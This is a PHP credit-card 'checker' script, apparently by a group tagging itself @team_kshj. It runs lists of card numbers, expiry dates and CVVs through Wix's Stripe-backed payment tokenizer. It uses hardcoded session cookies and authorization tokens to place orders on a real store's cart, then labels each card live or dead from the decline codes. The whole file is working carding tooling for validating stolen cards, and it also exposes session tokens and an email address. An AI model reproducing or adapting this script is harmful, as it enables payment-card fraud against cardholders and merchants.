<?php

////////////[2 Curl Template]////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

///////////////[Functions]///////////////

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

switch ($mes) {
  case '01':
  $mes = '1';
    break;
  case '02':
  $mes = '2';
    break;
  case '03':
  $mes = '3';
    break;
  case '04':
  $mes = '4';
    break;
  case '05':
  $mes = '5';
    break;
  case '06':
  $mes = '6';
    break;
  case '07':
  $mes = '7';
    break;
  case '08':
  $mes = '8';
    break;
    case '09':
    $mes = '9';
    break;
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

//======

////////[Credentials Randomizer]/////////

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////PROXY

//////////////[first Curl Header]//////////

 $ch = curl_init();

 curl_setopt($ch, CURLOPT_URL, 'https://cashier-pci.wixapps.net/api/tokenize/v2/tokens');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Content-Type: application/json',
    'Host: cashier-pci.wixapps.net',
   'Origin: https://cashier-pci.wixapps.net',
      'Cookie: TS0170d8a0=0149ce1e2767a5774d7bd4197edcec2c7c4ac23b65212d55bc8dac028610f8ef5aadd2b8f359e8fe2a120fd74facb99e8a1f1dc1c1;',   
               'Referer: https://cashier-pci.wixapps.net/card-form?locale=en&providerId=com.stripe&parentOrigin=https%3A%2F%2Fecom.wixapps.net&startLoadTime=1596977749081&visitorId=a68773fb-2d54-4b2f-9aee-4c21663c92ba&siteOwnerId=8fe346f8-c5da-4cf6-98f6-f44bbea3160e', 
                'Sec-Fetch-Dest: empty',
                      'sec-fetch-mode: cors',
                          'Sec-Fetch-Site: same-origin'));


             curl_setopt($ch, CURLOPT_POSTFIELDS, '{"creditCard":{"number":"'.$cc.'","additionalInformation":{"holderName":"Brenda Dickey"},"expiration":{"year":'.$ano.',"month":'.$mes.'}},"cvv":"'.$cvv.'"}');

                       $resultx = curl_exec($ch);
                            $token = trim(strip_tags(GetStr($resultx,'"token":"','"')));
                                  if (isset($token)) {

//====================SECOND Hackerman
                                           $ch = curl_init();
                                           
 curl_setopt($ch, CURLOPT_URL, 'https://cashier-pci.wixapps.net/api/tokenize/v2/tokens');
      curl_setopt($ch, CURLOPT_URL, 'https://ecom.wixapps.net/_api/payment-services-web/payments/v2/payment-details');
                              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                       'Content-Type: application/json',  
        'authorization: eGi9-tC3gn7EUGnk_8bpiL1vcZtTmiVO2FwEyFbEwoI.eyJpbnN0YW5jZUlkIjoiMTQwZTEwYmMtZDNjNS04NGQ0LTMwZTgtNGJhN2RmMmEyZDI5IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYWFmNjcyZmQtMmFlYS00OGVmLWJiMzAtOGE4NWE3MTgyZTVlIiwic2lnbkRhdGUiOiIyMDIwLTA4LTA5VDEzOjE0OjUzLjU3NFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJQcmVtaXVtMSIsImRlbW9Nb2RlIjpmYWxzZSwib3JpZ2luSW5zdGFuY2VJZCI6IjEzYzM2MTA5LTVjYTgtODFmMS1lZWZjLTYxMmE2YjViM2UwMyIsImFpZCI6ImE2ODc3M2ZiLTJkNTQtNGIyZi05YWVlLTRjMjE2NjNjOTJiYSIsImJpVG9rZW4iOiJiZWY4NjI0MS1mOTJmLWNjM2ItOGJkOC1jMTIyNzgzMjAzNzciLCJzaXRlT3duZXJJZCI6IjhmZTM0NmY4LWM1ZGEtNGNmNi05OGY2LWY0NGJiZWEzMTYwZSJ9',
              'referer: https://ecom.wixapps.net/storefront/checkout?a11y=false&cacheKiller=1596977684237&cartId=c394cf7d-7efa-414a-954e-f485bf7e72e0&cashierPaymentId&commonConfig=%7B%22brand%22%3A%22wix%22%2C%22consentPolicy%22%3A%7B%22essential%22%3Atrue%2C%22functional%22%3Atrue%2C%22analytics%22%3Atrue%2C%22advertising%22%3Atrue%2C%22dataToThirdParty%22%3Atrue%7D%2C%22consentPolicyHeader%22%3A%7B%22consent-policy%22%3A%22%257B%2522func%2522%253A1%252C%2522anl%2522%253A1%252C%2522adv%2522%253A1%252C%2522dt3%2522%253A1%252C%2522ess%2522%253A1%257D%22%7D%2C%22bsi%22%3A%2261ac922a-3e00-42ee-a3f2-a5d42b4a124c%7C5%22%7D&compId=TPAMultiSection_jsoyvbsw&consent-policy=%7B%7BconsentPolicy%7D%7D&deviceType=desktop&instance=Uw0AZBnptPuZV7zfrnQlYzDNddYOCabgh9M8yNNrFgI.eyJpbnN0YW5jZUlkIjoiMTQwZTEwYmMtZDNjNS04NGQ0LTMwZTgtNGJhN2RmMmEyZDI5IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYWFmNjcyZmQtMmFlYS00OGVmLWJiMzAtOGE4NWE3MTgyZTVlIiwic2lnbkRhdGUiOiIyMDIwLTA4LTA5VDEyOjU0OjQyLjAyN1oiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJQcmVtaXVtMSIsImRlbW9Nb2RlIjpmYWxzZSwib3JpZ2luSW5zdGFuY2VJZCI6IjEzYzM2MTA5LTVjYTgtODFmMS1lZWZjLTYxMmE2YjViM2UwMyIsImFpZCI6ImE2ODc3M2ZiLTJkNTQtNGIyZi05YWVlLTRjMjE2NjNjOTJiYSIsImJpVG9rZW4iOiJiZWY4NjI0MS1mOTJmLWNjM2ItOGJkOC1jMTIyNzgzMjAzNzciLCJzaXRlT3duZXJJZCI6IjhmZTM0NmY4LWM1ZGEtNGNmNi05OGY2LWY0NGJiZWEzMTYwZSJ9&isFastFlow=false&isPickupFlow=false&locale=en&origin=cart&originType=addToCart&pageId=pv3ny&section-url=https%3A%2F%2Fwww.jqroundtwo.com%2Fcheckout%2F&siteRevision=114&storeUrl=https%3A%2F%2Fwww.jqroundtwo.com%2F&target=_top&viewMode=site&viewerCompId=TPAMultiSection_jsoyvbsw&vsi=b878575e-6861-4d6a-98f4-4434ef9c06fe&width=100%25',
                                          'origin: https://ecom.wixapps.net',
                             'Sec-Fetch-Dest: empty',
                 'sec-fetch-mode: cors',
         'Sec-Fetch-Site: same-origin' ));
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"details":{"paymentMethod":"creditCard","billingAddress":{"email":"ahsanjutt568@gmail.com"},"redirectTarget":"SAME_WINDOW","installments":1,"token":"'.$token.'","buyerInfo":{"buyerId":"41c7c505-e435-426a-a4ea-1aceedd5440f","buyerLanguage":"en"},"clientInfo":{"deviceFingerprint":"f620220863cc4eec5aa1e1ec075d4c2f"}}}');



                                                 $genos = curl_exec($ch);
                                 $detailsID = trim(strip_tags(GetStr($genos,'"detailsId":"','"')));


//MUDAMUDAMUDAMUDAMUDAMUDA VS OROROROORORORORORORORORO

                                        $ch = curl_init();

 curl_setopt($ch, CURLOPT_URL, 'https://cashier-pci.wixapps.net/api/tokenize/v2/tokens');
        curl_setopt($ch, CURLOPT_URL, 'https://ecom.wixapps.net/_api/wix-ecommerce-renderer-web/store-front/checkout/cart/c394cf7d-7efa-414a-954e-f485bf7e72e0/placeOrder?paymentId='.$detailsID.'&shouldRedirect=true&isPickupFlow=false&forceLocale=en&deviceType=desktop&inUserDomain=true');
                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
      'authorization: eGi9-tC3gn7EUGnk_8bpiL1vcZtTmiVO2FwEyFbEwoI.eyJpbnN0YW5jZUlkIjoiMTQwZTEwYmMtZDNjNS04NGQ0LTMwZTgtNGJhN2RmMmEyZDI5IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYWFmNjcyZmQtMmFlYS00OGVmLWJiMzAtOGE4NWE3MTgyZTVlIiwic2lnbkRhdGUiOiIyMDIwLTA4LTA5VDEzOjE0OjUzLjU3NFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJQcmVtaXVtMSIsImRlbW9Nb2RlIjpmYWxzZSwib3JpZ2luSW5zdGFuY2VJZCI6IjEzYzM2MTA5LTVjYTgtODFmMS1lZWZjLTYxMmE2YjViM2UwMyIsImFpZCI6ImE2ODc3M2ZiLTJkNTQtNGIyZi05YWVlLTRjMjE2NjNjOTJiYSIsImJpVG9rZW4iOiJiZWY4NjI0MS1mOTJmLWNjM2ItOGJkOC1jMTIyNzgzMjAzNzciLCJzaXRlT3duZXJJZCI6IjhmZTM0NmY4LWM1ZGEtNGNmNi05OGY2LWY0NGJiZWEzMTYwZSJ9',   
                                 'Content-Type: application/json; charset=utf-8',
             'referer: https://ecom.wixapps.net/storefront/checkout?a11y=false&cacheKiller=1596977684237&cartId=c394cf7d-7efa-414a-954e-f485bf7e72e0&cashierPaymentId&commonConfig=%7B%22brand%22%3A%22wix%22%2C%22consentPolicy%22%3A%7B%22essential%22%3Atrue%2C%22functional%22%3Atrue%2C%22analytics%22%3Atrue%2C%22advertising%22%3Atrue%2C%22dataToThirdParty%22%3Atrue%7D%2C%22consentPolicyHeader%22%3A%7B%22consent-policy%22%3A%22%257B%2522func%2522%253A1%252C%2522anl%2522%253A1%252C%2522adv%2522%253A1%252C%2522dt3%2522%253A1%252C%2522ess%2522%253A1%257D%22%7D%2C%22bsi%22%3A%2261ac922a-3e00-42ee-a3f2-a5d42b4a124c%7C5%22%7D&compId=TPAMultiSection_jsoyvbsw&consent-policy=%7B%7BconsentPolicy%7D%7D&deviceType=desktop&instance=Uw0AZBnptPuZV7zfrnQlYzDNddYOCabgh9M8yNNrFgI.eyJpbnN0YW5jZUlkIjoiMTQwZTEwYmMtZDNjNS04NGQ0LTMwZTgtNGJhN2RmMmEyZDI5IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYWFmNjcyZmQtMmFlYS00OGVmLWJiMzAtOGE4NWE3MTgyZTVlIiwic2lnbkRhdGUiOiIyMDIwLTA4LTA5VDEyOjU0OjQyLjAyN1oiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJQcmVtaXVtMSIsImRlbW9Nb2RlIjpmYWxzZSwib3JpZ2luSW5zdGFuY2VJZCI6IjEzYzM2MTA5LTVjYTgtODFmMS1lZWZjLTYxMmE2YjViM2UwMyIsImFpZCI6ImE2ODc3M2ZiLTJkNTQtNGIyZi05YWVlLTRjMjE2NjNjOTJiYSIsImJpVG9rZW4iOiJiZWY4NjI0MS1mOTJmLWNjM2ItOGJkOC1jMTIyNzgzMjAzNzciLCJzaXRlT3duZXJJZCI6IjhmZTM0NmY4LWM1ZGEtNGNmNi05OGY2LWY0NGJiZWEzMTYwZSJ9&isFastFlow=false&isPickupFlow=false&locale=en&origin=cart&originType=addToCart&pageId=pv3ny&section-url=https%3A%2F%2Fwww.jqroundtwo.com%2Fcheckout%2F&siteRevision=114&storeUrl=https%3A%2F%2Fwww.jqroundtwo.com%2F&target=_top&viewMode=site&viewerCompId=TPAMultiSection_jsoyvbsw&vsi=b878575e-6861-4d6a-98f4-4434ef9c06fe&width=100%25',
                                        'origin: https://ecom.wixapps.net',
                                              'cache-control: no-cache',
                                                  'Sec-Fetch-Dest: empty',
                                                    'sec-fetch-mode: cors',
                                                  'Sec-Fetch-Site: same-origin' ));

      curl_setopt($ch, CURLOPT_POSTFIELDS, 'paymentId='.$detailsID.'&shouldRedirect=true&isPickupFlow=false&forceLocale=en&deviceType=desktop&inUserDomain=true');
                                                   $jotaro = curl_exec($ch);

                        $failureDetails = trim(strip_tags(GetStr($jotaro,'"failureDetails":"','"')));
                      $redirectUrl = trim(strip_tags(GetStr($jotaro,'"redirectUrl":"','"')));


////////////////////////////===[Card Response]



if(strpos($jotaro, '"failureDetails":"3012"' )) {
    echo '<span class="badge badge-success">#Aprovada</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: Approved (͏CVV) but Insufficient Balance </span></span> <span class="badge badge-warning"> BAD LUCK </span> <span class="badge badge-info"> ♛ ANIK ♛ </span> </br>';
}elseif(strpos($jotaro, '"failureDetails":"3016"' )) {
    echo '<span class="badge badge-success">#Aprovada</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: Security code is Incorrect </span></span> <span class="badge badge-warning"> CCN LIVE </span> <span class="badge badge-info"> ♛ KSHJ ♛ </span> </br>';
}
elseif(strpos($jotaro, '"failureDetails":"3000"' )) {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: DECLINED </span> </span> <span class="badge badge-warning"> ♛ KSHJ ♛ </span> <span class="badge badge-info"> BAD LUCK </span></span> </br>';
}elseif(strpos($jotaro, '"failureDetails":"3002"' )) {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: transaction not allowed </span> </span> <span class="badge badge-warning"> ♛ KSHJ ♛ </span> <span class="badge badge-info"> BAD LUCK </span></span> </br>';
}elseif(strpos($jotaro, '"failureDetails":"5000"' )) {
    echo '<span class="badge badge-warning">#DIE</span></span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: Transaction could not be processed. </span> </span> <span class="badge badge-warning"> ♛ KSHJ ♛ </span> <span class="badge badge-info"> BAD LUCK </span></span> </br>';
}elseif(strpos($jotaro, '"failureDetails":"6000"' )) {
  echo '<span class="badge badge-success">#Aprovada</span></span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-success"> [CHECKER Message]: CVV Matched. </span> </span> <span class="badge badge-success"> ♛ KSHJ ♛ </span> <span class="badge badge-info"> LUCK </span></span> </br>';
}elseif(strpos($jotaro, '"failureDetails":"3015"' )) {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: Your card\'s number is incorrect. </span> </span> <span class="badge badge-warning"> ♛ KSHJ ♛ </span> <span class="badge badge-info"> BAD LUCK </span></span> </br>';
}elseif(strpos($jotaro, '"failureDetails":"5002"' )) {
  echo '<span class="badge badge-waning">#DIE</span></span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: Processor declined. </span> </span> <span class="badge badge-warning"> ♛ KSHJ ♛ </span> <span class="badge badge-warning"> DECLINED </span></span> </br>';
}elseif(strpos($jotaro, '"failureDetails":"2007"' )) {
  echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: This payment method is not available right now. </span> </span> <span class="badge badge-warning"> ♛ KSHJ ♛ </span> <span class="badge badge-info"> BAD LUCK </span></span> </br>';
}elseif(strpos($jotaro, '"errorCode":10009,' )) {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> [CHECKER Message]: Somethings wrong sensei. </span> </span> <span class="badge badge-warning"> '.$resultx.' </span> <span class="badge badge-info"> BAD LUCK </span></span> </br>'.$failureDetails;
}
else {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> Dead Proxy/Error Not listed </span> </span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> ♛ KSHJ ♛ </span></span> </br>'.$jotaro;
}
} else {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> [@team_kshj] </span> <span class="badge badge-warning"> TOKEN NOT SET/CARD NOT ALLOWED IN CHECKER/PROXY ERROR </span> </span> <span class="badge badge-warning"> '.$resultx.' </span> <span class="badge badge-info"> BAD LUCK </span></span> </br>';


 }   
////////////////////////////////////////

curl_close($ch);
ob_flush();


?>